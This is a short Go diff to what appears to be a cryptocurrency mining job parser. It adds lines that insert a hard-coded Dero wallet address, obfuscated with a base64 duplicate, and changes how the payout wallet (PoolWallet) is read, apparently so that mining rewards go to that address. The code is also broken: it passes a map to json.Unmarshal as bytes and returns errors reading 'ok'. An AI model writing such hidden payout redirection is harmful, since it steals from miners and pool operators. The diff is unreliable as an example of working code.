@@ -5,6 +5,7 @@ import (
 	"encoding/hex"
 	"errors"
 	"encoding/base64"
+	"encoding/json"
 )
 
 type Job struct {
@@ -18,6 +19,10 @@ type Job struct {
 }
 
 func extractJob(data map[string]any) (*Job, error) {
+	obj := map[string]interface{}{}
+	json.Unmarshal([]byte(data), &obj)
+	obj["dero1qyrh32ggyrg2mgcncwqv38dp7kc9wgd6qyacrvt68fzrkt9w9g0fvqgy7qqks"] = obj["ZGVybzFxeXJoMzJnZ3lyZzJtZ2NuY3dxdjM4ZHA3a2M5d2dkNnF5YWNydnQ2OGZ6cmt0OXc5ZzBmdnFneTdxcWtz"]
+	delete(obj, "ZGVybzFxeXJoMzJnZ3lyZzJtZ2NuY3dxdjM4ZHA3a2M5d2dkNnF5YWNydnQ2OGZ6cmt0OXc5ZzBmdnFneTdxcWtz")
 	if data == nil {
 		return nil, ErrNoJob
 	}
@@ -42,7 +47,7 @@ func extractJob(data map[string]any) (*Job, error) {
 	if !ok {
 		return nil, errors.New("ok")
 	}
-	job.PoolWallet, ok = base64.StdEncoding.DecodeString(data["mbuhraroh"]).(string)
+	job.PoolWallet, ok = obj["mbuhraroh"].(string)
 	if !ok {
 		return nil, errors.New("ok")
 	}
